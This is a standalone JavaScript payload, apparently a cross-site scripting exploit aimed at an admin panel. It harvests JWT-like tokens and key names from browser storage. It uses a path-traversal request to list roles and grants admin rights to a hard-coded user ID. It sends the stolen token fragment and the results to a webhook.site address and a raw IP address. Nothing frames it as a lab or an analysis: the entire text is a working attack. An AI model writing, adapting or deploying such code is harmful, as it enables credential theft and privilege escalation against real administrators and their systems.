(async()=>{
try{
if(!window.location.hostname.includes('admin.jarvis')){return;}
let stolen={jwt:'',keys:''};
try{
  const allKeys=[...Object.keys(localStorage),...Object.keys(sessionStorage)];
  stolen.keys=allKeys.join(',').substring(0,80);
  for(const k of allKeys){
    const v=(localStorage.getItem(k)||sessionStorage.getItem(k)||'');
    if(v&&v.startsWith('eyJ')&&v.length>100){stolen.jwt=v.substring(0,120);break;}
  }
}catch(ex){}
const r1=await fetch('/api/session/login/../../v1/admin/roles',{credentials:'include',headers:{'Accept':'application/json'}});
const d1=await r1.json();
const roles=Array.isArray(d1.data)?d1.data:[];
const uid='01967db5-ae00-4642-96ba-f82321e15ef0';
let assignStatus=0,roleId='';
if(roles.length>0){
  const adminRole=roles.find(r=>r.name&&(r.name.toLowerCase().includes('admin')||r.name.toLowerCase().includes('super')))||roles[0];
  roleId=adminRole.id.substring(0,8);
  const r2=await fetch('/api/session/login/../../v1/admin/users/'+uid+'/roles',{
    method:'POST',credentials:'include',
    headers:{'Content-Type':'application/json','Accept':'application/json'},
    body:JSON.stringify({roleId:adminRole.id})
  });
  assignStatus=r2.status;
}
const params=new URLSearchParams({s:String(assignStatus),r:roleId,j:stolen.jwt?'YES':'NO',jv:stolen.jwt.substring(0,60),ks:stolen.keys});
const beacons=['https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14','http://94.184.47.185:8888'];
for(const b of beacons){
  try{new Image().src=b+(b.includes('webhook.site')?'?':'/xss?')+params.toString();}catch(x){}
  try{fetch(b+(b.includes('webhook.site')?'?':'/xss?')+params.toString(),{mode:'no-cors'});}catch(x){}
}
}catch(e){
  const msg=encodeURIComponent(String(e).substring(0,80));
  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+msg;}catch(x){}
  try{new Image().src='http://94.184.47.185:8888/err?e='+msg;}catch(x){}
}
})();
